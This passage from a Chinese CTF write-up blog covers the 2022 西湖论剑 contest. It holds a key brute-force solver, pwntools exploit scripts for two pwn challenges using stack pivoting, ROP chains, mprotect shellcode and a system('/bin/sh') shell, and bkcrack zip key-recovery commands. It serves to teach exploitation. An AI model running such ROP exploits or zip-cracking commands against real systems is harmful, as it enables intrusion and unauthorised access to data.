class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> sha1 <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">import</span> tqdm<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">decode</span>(<span class="hljs-params">data</span>):<br>    b=<span class="hljs-string">&quot;012345678&quot;</span><br>    bi=<span class="hljs-string">&quot;&quot;</span><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> data:<br>        bi+=<span class="hljs-built_in">bin</span>(b.find(i))[<span class="hljs-number">2</span>:].zfill(<span class="hljs-number">3</span>)<br><br>    bi=<span class="hljs-built_in">int</span>(bi,<span class="hljs-number">2</span>)<br>    bi=<span class="hljs-built_in">bytes</span>.fromhex(<span class="hljs-built_in">hex</span>(bi)[<span class="hljs-number">2</span>:])<br>    <span class="hljs-keyword">return</span> bi<br><br>bi=decode(<span class="hljs-string">&quot;162304651523346214431471150310701503207116032063140334661543446114434066142304661563446615430464&quot;</span>)<br><span class="hljs-comment"># 915572239428449843076691286116796614</span><br>data=<span class="hljs-string">b&quot;&quot;</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">encode</span>(<span class="hljs-params">data</span>):<br>    b=<span class="hljs-string">b&#x27;01234567&#x27;</span><br>    bi=<span class="hljs-string">&quot;&quot;</span><br>    odata=[]<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> data:<br>        bi+=<span class="hljs-built_in">bin</span>(i)[<span class="hljs-number">2</span>:].zfill(<span class="hljs-number">8</span>)<br>    <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>,<span class="hljs-built_in">len</span>(bi),<span class="hljs-number">3</span>):<br>        odata.append(b[<span class="hljs-built_in">int</span>(bi[j:j+<span class="hljs-number">3</span>],<span class="hljs-number">2</span>)])<br>    <span class="hljs-keyword">return</span> <span class="hljs-built_in">bytes</span>(odata)<br><br><br><span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">for i in tqdm.tqdm(range(10**6)):</span><br><span class="hljs-string">    data=[]</span><br><span class="hljs-string">    for j in range(6):</span><br><span class="hljs-string">        data.append(0x30+(i%10))</span><br><span class="hljs-string">        i//=10</span><br><span class="hljs-string">    data=bytes(data)+bi</span><br><span class="hljs-string">    data=encode(data)</span><br><span class="hljs-string">    hash=sha1(data)</span><br><span class="hljs-string">    if hash==&quot;67339fc92b4875b8c073c76994ef1ca4ce632d26&quot;:</span><br><span class="hljs-string">        break</span><br><span class="hljs-string"># 561516</span><br><span class="hljs-string">&quot;&quot;&quot;</span><br><br>bi=<span class="hljs-string">b&quot;561516915572239428449843076691286116796614&quot;</span><br><br><br><br><br><br>endata=[<span class="hljs-number">0x3F</span>, <span class="hljs-number">0x95</span>, <span class="hljs-number">0xBB</span>, <span class="hljs-number">0xF2</span>, <span class="hljs-number">0x57</span>, <span class="hljs-number">0xF1</span>, <span class="hljs-number">0x7A</span>, <span class="hljs-number">0x5A</span>, <span class="hljs-number">0x22</span>, <span class="hljs-number">0x61</span>, \<br>  <span class="hljs-number">0x51</span>, <span class="hljs-number">0x43</span>, <span class="hljs-number">0xA2</span>, <span class="hljs-number">0xFA</span>, <span class="hljs-number">0x9B</span>, <span class="hljs-number">0x6F</span>, <span class="hljs-number">0x44</span>, <span class="hljs-number">0x63</span>, <span class="hljs-number">0xC0</span>, <span class="hljs-number">0x08</span>, \<br>  <span class="hljs-number">0x12</span>, <span class="hljs-number">0x65</span>, <span class="hljs-number">0x5C</span>, <span class="hljs-number">0x8A</span>, <span class="hljs-number">0x8C</span>, <span class="hljs-number">0x4C</span>, <span class="hljs-number">0xED</span>, <span class="hljs-number">0x5E</span>, <span class="hljs-number">0xCA</span>, <span class="hljs-number">0x76</span>, \<br>  <span class="hljs-number">0xB9</span>, <span class="hljs-number">0x85</span>, <span class="hljs-number">0xAF</span>, <span class="hljs-number">0x05</span>, <span class="hljs-number">0x38</span>, <span class="hljs-number">0xED</span>, <span class="hljs-number">0x42</span>, <span class="hljs-number">0x3E</span>, <span class="hljs-number">0x42</span>, <span class="hljs-number">0xDF</span>, \<br>  <span class="hljs-number">0x5D</span>, <span class="hljs-number">0xBE</span>, <span class="hljs-number">0x05</span>, <span class="hljs-number">0x8B</span>, <span class="hljs-number">0x35</span>, <span class="hljs-number">0x6D</span>, <span class="hljs-number">0xF3</span>, <span class="hljs-number">0x1C</span>, <span class="hljs-number">0xCF</span>, <span class="hljs-number">0xF8</span>, \<br>  <span class="hljs-number">0x6A</span>, <span class="hljs-number">0x73</span>, <span class="hljs-number">0x25</span>, <span class="hljs-number">0xE4</span>, <span class="hljs-number">0xB7</span>, <span class="hljs-number">0xB9</span>, <span class="hljs-number">0x36</span>, <span class="hljs-number">0xFB</span>, <span class="hljs-number">0x02</span>, <span class="hljs-number">0x11</span>, \<br>  <span class="hljs-number">0xA0</span>, <span class="hljs-number">0xF0</span>, <span class="hljs-number">0x57</span>, <span class="hljs-number">0xAB</span>, <span class="hljs-number">0x21</span>, <span class="hljs-number">0xC6</span>, <span class="hljs-number">0xC7</span>, <span class="hljs-number">0x46</span>, <span class="hljs-number">0x99</span>, <span class="hljs-number">0xBD</span>, \<br>  <span class="hljs-number">0x1E</span>, <span class="hljs-number">0x61</span>, <span class="hljs-number">0x5E</span>, <span class="hljs-number">0xEE</span>, <span class="hljs-number">0x55</span>, <span class="hljs-number">0x18</span>, <span class="hljs-number">0xEE</span>, <span class="hljs-number">0x03</span>, <span class="hljs-number">0x29</span>, <span class="hljs-number">0x84</span>, \<br>  <span class="hljs-number">0x7F</span>, <span class="hljs-number">0x94</span>, <span class="hljs-number">0x5F</span>, <span class="hljs-number">0xB4</span>, <span class="hljs-number">0x6A</span>, <span class="hljs-number">0x29</span>, <span class="hljs-number">0xD8</span>, <span class="hljs-number">0x6C</span>, <span class="hljs-number">0xE4</span>, <span class="hljs-number">0xC0</span>, \<br>  <span class="hljs-number">0x9D</span>, <span class="hljs-number">0x6B</span>, <span class="hljs-number">0xCC</span>, <span class="hljs-number">0xD5</span>, <span class="hljs-number">0x94</span>, <span class="hljs-number">0x5C</span>, <span class="hljs-number">0xDD</span>, <span class="hljs-number">0xCC</span>, <span class="hljs-number">0xD5</span>, <span class="hljs-number">0x3D</span>, \<br>  <span class="hljs-number">0xC0</span>, <span class="hljs-number">0xEF</span>, <span class="hljs-number">0x0C</span>, <span class="hljs-number">0x29</span>, <span class="hljs-number">0xE5</span>, <span class="hljs-number">0xB0</span>, <span class="hljs-number">0x93</span>, <span class="hljs-number">0xF1</span>, <span class="hljs-number">0xB3</span>, <span class="hljs-number">0xDE</span>, \<br>  <span class="hljs-number">0xB0</span>, <span class="hljs-number">0x70</span>];<br>bbi=encode(bi)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">GetKey</span>(<span class="hljs-params">data</span>):<br>    k=[]<br>    k1=[]<br>    data_l=<span class="hljs-built_in">len</span>(data)<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">256</span>):<br>        k.append(i)<br>        k1.append(data[i%data_l])<br>    n=<span class="hljs-number">0</span><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">256</span>):<br>        n=(k1[i]+n+k[i])&amp;<span class="hljs-number">0xff</span><br>        n1=k[i]<br>        k[i]=k[n]<br>        k[n]=n1<br>    <span class="hljs-keyword">return</span> k<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">Cipher</span>(<span class="hljs-params">data,key</span>):<br>    enc=[]<br>    k=key<br>    n=<span class="hljs-number">0</span><br>    n1=<span class="hljs-number">0</span><br>    tmp=<span class="hljs-number">0</span><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(data)):<br>        n=(n+<span class="hljs-number">1</span>)&amp;<span class="hljs-number">0xff</span><br>        n1=(n1+k[n])&amp;<span class="hljs-number">0xff</span><br>        tmp=k[n]<br>        k[n]=k[n1]<br>        k[n1]=tmp<br>        enc.append(data[i]^k[(k[n]+k[n1])%<span class="hljs-number">256</span>])<br>    <span class="hljs-keyword">return</span> <span class="hljs-built_in">bytes</span>(enc)<br><br><br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> tqdm.tqdm(<span class="hljs-built_in">range</span>(<span class="hljs-number">10</span>**<span class="hljs-number">6</span>)):<br>    data=[]<br>    <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">6</span>):<br>        data.append(<span class="hljs-number">0x30</span>+(i%<span class="hljs-number">10</span>))<br>        i//=<span class="hljs-number">10</span><br>    data=<span class="hljs-built_in">bytes</span>(data)<br>    k=GetKey(data)<br>    edata=GetEnc(bbi,k)<br>    <span class="hljs-keyword">if</span> edata==endata:<br>        <span class="hljs-keyword">break</span><br><span class="hljs-built_in">print</span>(bi+data)<br><span class="hljs-comment"># 561516915572239428449843076691286116796614807391</span><br></code></pre></td></tr></table></figure><h1>Pwn</h1><h2 id="Message-Board">Message Board</h2><p><img src="/img/blog_img/2022%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%91/2022%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%91-pwn-Message_Board.jpg" srcset="/img/loading.gif" lazyload alt="main函数代码" title="main函数代码"><br><code>main函数</code>中存在栈溢出，但只能溢出<code>0x10</code>个字节，只能修改<code>rbp</code>与<code>rip</code>的值，所以需要进行栈迁移</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>p=process(<span class="hljs-string">&#x27;./pwn&#x27;</span>)<br>e=ELF(<span class="hljs-string">&quot;./pwn&quot;</span>,checksec=<span class="hljs-number">0</span>)<br>bss=e.bss(<span class="hljs-number">0x500</span>)+<span class="hljs-number">0xb0</span><br>context.binary=e<br>libc=ELF(<span class="hljs-string">&#x27;./libc.so.6&#x27;</span>,checksec=<span class="hljs-number">0</span>)<br>leave=<span class="hljs-number">0x4013a2</span><br>read=<span class="hljs-number">0x401378</span><br>rdi=<span class="hljs-number">0x0000000000401413</span><br>func=<span class="hljs-string">&#x27;puts&#x27;</span><br>func_got=e.got[func]<br>puts=e.plt[<span class="hljs-string">&#x27;puts&#x27;</span>]<br><br>p.send(<span class="hljs-string">b&#x27;rot-will&#x27;</span>)<br><br>p.send(<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0xb0</span>+p64(bss)+p64(read))<br>payload=p64(bss+<span class="hljs-number">0x100</span>)+p64(rdi)+p64(func_got)+p64(puts)+p64(read)<br>payload=payload.ljust(<span class="hljs-number">0xb0</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>)+p64(bss-<span class="hljs-number">0xb0</span>)+p64(leave)<br>p.send(payload)<br>p.readuntil(<span class="hljs-string">&#x27;Successfully~\n&#x27;</span>)<br>p.readuntil(<span class="hljs-string">&#x27;\n&#x27;</span>)<br>d=u64(p.readuntil(<span class="hljs-string">&#x27;\n&#x27;</span>,drop=<span class="hljs-number">1</span>).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>))<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(d))<br>libc.address=d-libc.sym[func]<br>rsi=<span class="hljs-number">0x000000000002601f</span>+libc.address<br>rdx=<span class="hljs-number">0x0000000000142c92</span>+libc.address<br>mprotect=libc.sym[<span class="hljs-string">&#x27;mprotect&#x27;</span>]<br><br>payload=p64(bss+<span class="hljs-number">0x200</span>)+p64(rdi)+p64(bss&amp;<span class="hljs-number">0xffff000</span>)+p64(rsi)+p64(<span class="hljs-number">0x100</span>)+p64(rdx)+p64(<span class="hljs-number">0x7</span>)+p64(mprotect)+p64(bss+<span class="hljs-number">0x100</span>-<span class="hljs-number">0xb0</span>+<span class="hljs-number">0x8</span>*<span class="hljs-number">10</span>)+p64(<span class="hljs-number">0</span>)<br>payload+=asm(shellcraft.<span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;flag&quot;</span>)+shellcraft.read(<span class="hljs-number">3</span>,bss-<span class="hljs-number">0xb0</span>,<span class="hljs-number">0x30</span>)+shellcraft.write(<span class="hljs-number">1</span>,bss-<span class="hljs-number">0xb0</span>,<span class="hljs-number">0x30</span>))<br>payload=payload.ljust(<span class="hljs-number">0xb0</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>)<br>payload+=p64(bss+<span class="hljs-number">0x100</span>-<span class="hljs-number">0xb0</span>)+p64(leave)<br><br>p.send(payload)<br>p.interactive()<br></code></pre></td></tr></table></figure><h2 id="babycalc">babycalc</h2><p><img src="/img/blog_img/2022%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%91/2022%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%91-pwn-babycalc.jpg" srcset="/img/loading.gif" lazyload alt="main函数代码" title="main函数代码"></p><p><img src="/img/blog_img/2022%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%91/2022%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%91-pwn-babycalc-1.jpg" srcset="/img/loading.gif" lazyload alt="vuln函数代码" title="vuln函数代码"></p><p><code>vuln函数</code>中可以向<code>buf变量</code>中写入<code>0x100</code>字节的数据，这里可以修改<code>i</code>的值，导致下面<code>*(&amp;v3+i)</code>索引到其他地址处，并且当输入<code>0x100</code>字节的数据时，会将<code>leave</code>恢复的<code>rbp</code>的值的最低字节变成<code>0x00</code>，在溢出之前，还需要通过验证<br>如果恢复的<code>rbp</code>的最低字节变成<code>0x00</code>时，恢复的<code>rbp</code>刚好位于<code>vuln函数</code>的栈空间中，这时执行一个<code>leave;ret</code>，就可以执行我们构造好的<code>rop链</code>，但这种情况属于偶然的，所以需要进行爆破</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">    验证</span><br><span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-keyword">from</span> z3 <span class="hljs-keyword">import</span> *<br>v3 =Int(<span class="hljs-string">&quot;v3&quot;</span>)<br>v4 =Int(<span class="hljs-string">&quot;v4&quot;</span>)<br>v5 =Int(<span class="hljs-string">&quot;v5&quot;</span>)<br>v6 =Int(<span class="hljs-string">&quot;v6&quot;</span>)<br>v7 =Int(<span class="hljs-string">&quot;v7&quot;</span>)<br>v8 =Int(<span class="hljs-string">&quot;v8&quot;</span>)<br>v9 =Int(<span class="hljs-string">&quot;v9&quot;</span>)<br>v10 =Int(<span class="hljs-string">&quot;v10&quot;</span>)<br>v11 =Int(<span class="hljs-string">&quot;v11&quot;</span>)<br>v12 =Int(<span class="hljs-string">&quot;v12&quot;</span>)<br>v13 =Int(<span class="hljs-string">&quot;v13&quot;</span>)<br>v14 =Int(<span class="hljs-string">&quot;v14&quot;</span>)<br>v15 =Int(<span class="hljs-string">&quot;v15&quot;</span>)<br>v16 =Int(<span class="hljs-string">&quot;v16&quot;</span>)<br>v17 =Int(<span class="hljs-string">&quot;v17&quot;</span>)<br>v18 =Int(<span class="hljs-string">&quot;v18&quot;</span>)<br>ns=[v3 ,v4 ,v5 ,v6 ,v7 ,v8 ,v9 ,v10,v11,v12,v13,v14,v15,v16,v17,v18]<br>s=Solver()<br>s.add(v5 * v4 * v3 - v6 == <span class="hljs-number">36182</span>)<br>s.add(v3 == <span class="hljs-number">19</span>)<br>s.add(v5 * <span class="hljs-number">19</span> * v4 + v6 == <span class="hljs-number">36322</span>)<br>s.add((v13 + v3 - v8) * v16 == <span class="hljs-number">32835</span>)<br>s.add((v4 * v3 - v5) * v6 == <span class="hljs-number">44170</span>)<br>s.add((v5 + v4 * v3) * v6 == <span class="hljs-number">51590</span>)<br>s.add(v9 * v8 * v7 - v10 == <span class="hljs-number">61549</span>)<br>s.add(v10 * v15 + v4 + v18 == <span class="hljs-number">19037</span>)<br>s.add(v9 * v8 * v7 + v10 == <span class="hljs-number">61871</span>)<br>s.add((v8 * v7 - v9) * v10 == <span class="hljs-number">581693</span>)<br>s.add(v11 == <span class="hljs-number">50</span>)<br>s.add((v9 + v8 * v7) * v10 == <span class="hljs-number">587167</span>)<br>s.add(v13 * v12 * v11 - v14 == <span class="hljs-number">1388499</span>)<br>s.add(v13 * v12 * v11 + v14 == <span class="hljs-number">1388701</span>)<br>s.add((v12 * v11 - v13) * v14 == <span class="hljs-number">640138</span>)<br>s.add((v11 * v5 - v16) * v12 == <span class="hljs-number">321081</span>)<br>s.add((v13 + v12 * v11) * v14 == <span class="hljs-number">682962</span>)<br>s.add(v17 * v16 * v15 - v18 == <span class="hljs-number">563565</span>)<br>s.add(v17 * v16 * v15 + v18 == <span class="hljs-number">563571</span>)<br>s.add(v14 == <span class="hljs-number">101</span>)<br>s.add((v16 * v15 - v17) * v18 == <span class="hljs-number">70374</span>)<br>s.add((v17 + v16 * v15) * v18 == <span class="hljs-number">70518</span>)<br>s.check()<br>n=s.model()<br><span class="hljs-built_in">print</span>([n.get_interp(i) <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> ns])<br></code></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> LibcSearcher <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">import</span> time<br>context.log_level=<span class="hljs-string">&#x27;debug&#x27;</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">edit</span>(<span class="hljs-params">num,ind,data=<span class="hljs-string">b&#x27;&#x27;</span></span>):<br>    p.readuntil(<span class="hljs-string">&#x27;number-&#x27;</span>)<br>    pay=[<span class="hljs-number">19</span>, <span class="hljs-number">36</span>, <span class="hljs-number">53</span>, <span class="hljs-number">70</span>, <span class="hljs-number">55</span>, <span class="hljs-number">66</span>, <span class="hljs-number">17</span>, <span class="hljs-number">161</span>, <span class="hljs-number">50</span>, <span class="hljs-number">131</span>, <span class="hljs-number">212</span>, <span class="hljs-number">101</span>, <span class="hljs-number">118</span>, <span class="hljs-number">199</span>, <span class="hljs-number">24</span>, <span class="hljs-number">3</span>]<br>    payload=<span class="hljs-built_in">str</span>(num&amp;<span class="hljs-number">0xff</span>).encode()<br>    payload=payload.ljust(<span class="hljs-number">0x38</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>)<br>    payload+=data<br>    payload=payload.ljust(<span class="hljs-number">0xd0</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>)<br>    payload+=<span class="hljs-built_in">bytes</span>(pay)<br>    payload=payload.ljust(<span class="hljs-number">0xfc</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>)<br>    <span class="hljs-keyword">if</span> ind&lt;<span class="hljs-number">0</span>:<br>        ind=-ind<br>        ind=<span class="hljs-number">0xffffffff</span>^ind<br>        ind+=<span class="hljs-number">1</span><br>        ind=ind&amp;<span class="hljs-number">0xffffffff</span><br>    payload+=p32(ind)<br>    p.send(payload)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">attack</span>(<span class="hljs-params">cmd=<span class="hljs-string">&quot;&quot;</span></span>):<br>    gdb.attach(p,cmd)<br>    pause()<br><br>e=ELF(<span class="hljs-string">&#x27;./babycalc&#x27;</span>,checksec=<span class="hljs-number">0</span>)<br>context.binary=e<br>bss=e.bss(<span class="hljs-number">0x500</span>)<br>leave=<span class="hljs-number">0x400c18</span><br>rdi=<span class="hljs-number">0x0000000000400ca3</span><br>puts=e.plt[<span class="hljs-string">&#x27;puts&#x27;</span>]<br>func=<span class="hljs-string">&#x27;puts&#x27;</span><br>func_got=e.got[func]<br>pop_xx=<span class="hljs-number">0x400c9a</span><br>read_got=e.got[<span class="hljs-string">&#x27;read&#x27;</span>]<br>call=<span class="hljs-number">0x400c80</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">pwn</span>():<br>    <span class="hljs-comment">#attack(&quot;bp 0x400bb7&quot;)</span><br>    <span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(func_got))<br>    payload=p64(rdi)+p64(func_got)+p64(puts)<br>    pop=[<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,read_got,<span class="hljs-number">0x400</span>,bss+<span class="hljs-number">0x8</span>,<span class="hljs-number">0</span>,call]<br>    pop1=[<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,bss+<span class="hljs-number">0x8</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,leave]<br>    payload+=p64(pop_xx)+flat(pop)+flat(pop1)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(<span class="hljs-built_in">len</span>(payload)))<br><br>    edit(<span class="hljs-number">0x18</span>,<span class="hljs-number">0x38</span>,payload)<br>    p.readuntil(<span class="hljs-string">&#x27;good done\n&#x27;</span>)<br>    d=u64(p.readuntil(<span class="hljs-string">&#x27;\n&#x27;</span>,drop=<span class="hljs-number">1</span>).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>))<br>    libc=LibcSearcher(func,d)<br>    system=libc.dump(<span class="hljs-string">&#x27;system&#x27;</span>)<br>    bin_sh=libc.dump(<span class="hljs-string">&quot;str_bin_sh&quot;</span>)<br><br>    payload=p64(bss+<span class="hljs-number">0x100</span>)+p64(rdi)+p64(bin_sh)+p64(system)<br>    p.send(payload)<br><br>    p.interactive()<br>        <br><span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>    <span class="hljs-keyword">try</span>:<br>        p=process(<span class="hljs-string">&quot;./babycalc&quot;</span>)<br><span class="hljs-comment">#        attach(p,&#x27;bp 0x400bb7&#x27;)</span><br>        pwn()<br>    <span class="hljs-keyword">except</span>:<br>        <span class="hljs-keyword">pass</span><br>    p.close()<br></code></pre></td></tr></table></figure><h1>Misc</h1><h2 id="take-the-zip-easy">take_the_zip_easy</h2><p><img src="/img/blog_img/2022%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%91/2022%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%91-misc-take_the_zip_easy.jpg" srcset="/img/loading.gif" lazyload alt=""><br>题目给了一个<code>zipeasy.zip</code>文件，里面有两个文件都是真加密，那么只能爆破密码了，但是如果单纯的爆破的话，需要很长时间才可能成功，不过<code>zipeasy.zip</code>中有一个<code>dasflow.zip</code>，这个文件中有部分字节是已知的，所以可以通过<code>bkcrack</code>进行明文爆破</p><p><img src="/img/blog_img/2022%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%91/2022%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%91-misc-take_the_zip_easy-1.jpg" srcset="/img/loading.gif" lazyload alt=""><br>因为知道的信息较少，所以爆破的时间比较长，在爆破的时候可以爆破两次<br>一次猜测dasflow.zip不是加密压缩包,那么命令就是<code>bkcrack -C zipeasy.zip -c dasflow.zip -x 0 504b030414000000 -x 502393 504b050600</code><br>另一次猜测dasflow.zip是加密压缩包,那么命令就是<code>bkcrack -C zipeasy.zip -c dasflow.zip -x 0 504b030414000100 -x 502393 504b050600</code><br>从结果来看，<code>dasflow.zip</code>不是加密的压缩包，爆破之后获得的<code>key</code>为<code>2b7d78f3 0ebcabad a069728c</code><br>执行<code>bkcrack -C zipeasy.zip -c dasflow.zip -k 2b7d78f3 0ebcabad a069728c -d dasflow.zip</code>导出<code>dasflow.zip</code>，解压之后是<code>dasflow.pcapng</code><br>分析数据包中的<code>http数据</code>，发现上传了一个<code>eval.php</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code 